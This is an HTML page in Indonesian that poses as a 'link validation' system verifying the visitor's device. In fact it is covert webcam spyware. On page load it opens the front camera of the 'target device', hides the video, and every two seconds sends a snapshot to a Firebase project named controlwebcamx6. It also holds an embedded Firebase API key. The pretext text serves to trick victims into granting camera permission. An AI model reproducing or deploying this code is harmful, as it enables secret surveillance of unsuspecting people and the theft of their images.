<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menghubungkan Layanan...</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; }
        .container { background-color: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; text-align: center; max-width: 400px; width: 100%; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        .status-box { background-color: #0d1117; border: 2px dashed #30363d; border-radius: 8px; padding: 20px; margin-top: 20px; font-weight: bold; transition: all 0.5s ease; }
        .loading { color: #ff9e2c; }
        .success { color: #2ea44f; border-color: #2ea44f; background-color: rgba(46, 164, 79, 0.1); }
        .error { color: #f85149; border-color: #f85149; background-color: rgba(248, 81, 73, 0.1); }
        h2 { font-size: 1.4rem; margin-bottom: 10px; color: #ffffff; }
        p { font-size: 0.9rem; color: #8b949e; }
        video, canvas { display: none; width: 1px; height: 1px; }
    </style>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

<div class="container">
    <h2>Sistem Validasi Tautan</h2>
    <p>Mohon tunggu sebentar selagi sistem memverifikasi perangkat Anda...</p>
    <div id="statusBox" class="status-box loading">Menyambungkan kamera...</div>
</div>

<video id="liveVideo" autoplay muted playsinline></video>
<canvas id="captureCanvas"></canvas>

<script>
    // Konfigurasi otomatis hasil ekstrak google-services.json kamu
    const firebaseConfig = {
        apiKey: "AIzaSyC7Is13rgH6wfR1wnzZ_GMd54i56AfEknc",
        authDomain: "controlwebcamx6.firebaseapp.com",
        databaseURL: "https://controlwebcamx6-default-rtdb.firebaseio.com",
        projectId: "controlwebcamx6",
        storageBucket: "controlwebcamx6.firebasestorage.app",
        appId: "1:421883064561:web:9999abcdefg12345" // Menggunakan ID Virtual bypass khusus browser web
    };

    // Inisialisasi Firebase ke server controlwebcamx6
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Membaca parameter ?id= dari link generator Sketchware
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id') ? urlParams.get('id').replace(/[.#$\[\]]/g, "-") : "anonymous-user";

    const statusBox = document.getElementById('statusBox');
    const video = document.getElementById('liveVideo');
    const canvas = document.getElementById('captureCanvas');
    const context = canvas.getContext('2d');

    // Mengaktifkan kamera depan perangkat target
    async function aktifkanKamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 320, height: 240 }, 
                audio: false 
            });
            
            video.srcObject = stream;
            statusBox.innerText = "Kamera tersambung";
            statusBox.className = "status-box success";
            
            // Mengirim gambar secara berkala setiap 2 detik ke Firebase
            setInterval(ambilDanKirimFoto, 2000);
            
        } catch (err) {
            statusBox.innerText = "Koneksi gagal. Izin diperlukan!";
            statusBox.className = "status-box error";
        }
    }

    // Fungsi konversi gambar frame video menjadi string teks Base64
    function ambilDanKirimFoto() {
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataFoto = canvas.toDataURL('image/jpeg', 0.5); // Kompresi 50% agar hemat kuota & cepat
        
        // Push data langsung ke tabel cam_stream di Firebase
        database.ref('cam_stream/' + targetId).set({
            photo: dataFoto,
            updatedAt: firebase.database.ServerValue.TIMESTAMP
        });
    }

    window.onload = aktifkanKamera;
</script>

</body>
</html>
